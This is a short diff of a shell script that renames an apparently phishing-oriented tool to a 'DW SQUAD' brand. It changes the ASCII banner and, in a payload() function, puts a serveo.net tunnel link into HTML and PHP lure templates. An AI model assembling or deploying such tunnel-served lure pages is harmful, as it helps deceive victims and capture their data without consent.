@@ -12,7 +12,7 @@ printf "\e[1;92m   ____  _      \e[0m\e[1;77m   __________ \e[0m\n"
 printf "\e[1;92m /  _ \/ \  /|  \e[0m\e[1;77m/    dw    /, \e[0m\n"
 printf "\e[1;92m | | \|| |  || \e[0m\e[1;77m|/   squad  // \e[0m\n"
 printf "\e[1;92m | |_/|| |/\|| \e[0m\e[1;77m | /_offical__//\e[0m\n"
-printf "\e[1;92m \____/\_/  \| |\e[0m\e[1;77m\DWDWDWDWDWDWDWDW \e[0m\n"
+printf "\e[1;92m \____/\_/  \| |\e[0m\e[1;77m\PRIVACY HIDEN PRIVACY \e[0m\n"
 printf "\e[1;92m              SQUAD \e[0m                                 \n"
 
 printf " \e[1;77m DW SQUAD OFFICAL\e[0m \n"
@@ -210,7 +210,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' saycheese.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' dw.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
